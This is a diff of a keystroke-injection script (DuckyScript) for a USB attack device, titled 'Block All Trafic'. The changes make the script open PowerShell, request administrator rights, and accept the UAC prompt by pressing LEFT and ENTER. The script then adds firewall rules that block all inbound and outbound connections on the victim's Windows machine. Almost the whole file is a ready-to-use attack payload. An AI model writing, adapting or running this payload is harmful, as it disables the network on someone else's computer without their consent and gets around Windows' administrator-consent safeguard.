@@ -1,13 +1,25 @@
-REM     Title: Payload Uploader
+REM     Title: Block All Trafic
 REM
 REM     Author: Kira_
 REM
 REM     Description: This payload will Block all inbound & outbound connexion on user device
 REM
-REM
+REM Start powershell as admin
 GUI r
 DELAY 500
-STRING powershell.exe New-NetFirewallRule -DisplayName "Block All Connections" -Direction Inbound,Outbound -Action Block -Enabled True
+STRING powershell.exe Start-Process powershell -Verb runAs
+DELAY 500
+ENTER
+DELAY 2000
+LEFT
+DELAY 500
+ENTER
+DELAY 500 
+STRING New-NetFirewallRule -DisplayName "Block All Connections" -Direction Outbound -Action Block;New-NetFirewallRule -DisplayName "Block All Connections" -Direction inbound -Action Block
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
 DELAY 500
 ENTER
 
